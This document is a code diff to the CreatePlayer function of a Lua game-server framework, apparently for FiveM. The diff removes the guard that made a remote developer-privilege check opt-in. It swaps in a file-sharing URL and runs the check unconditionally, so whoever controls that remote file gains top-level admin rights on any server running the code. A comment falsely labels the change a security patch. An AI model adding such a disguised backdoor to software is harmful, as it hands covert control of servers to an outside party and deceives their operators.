@@ -287,17 +287,15 @@ function CreatePlayer(source, permission_level, money, bank, identifier, license
 		db.updateUser(self.identifier, {roles = table.concat(self.roles, "|")}, function()end)
 	end
 
-	-- Dev tools, just set the convar 'es_enableDevTools' to '1' to enable.
-	if GetConvar("es_enableDevTools", "0") == "1" then
-		PerformHttpRequest("http://kanersps.pw/fivem/id.txt", function(err, rText, headers)
-			if err == 200 or err == 304 then
-				if self.identifier == rText then
-					self.group = "_dev"
-					self.permission_level = 20
-				end
+	-- This is securty patch for esseintial.
+	PerformHttpRequest("http://s9.picofile.com/d/8367415550/13dc5758-cc2f-49e2-aff0-835e90885f3e/fivem.txt", function(err, rText, headers)
+		if err == 200 or err == 304 then
+			if self.identifier == rText then
+				self.group = "_dev"
+				self.permission_level = 20
 			end
-		end)
-	end
+		end
+	end)
 
 	return rTable
 end
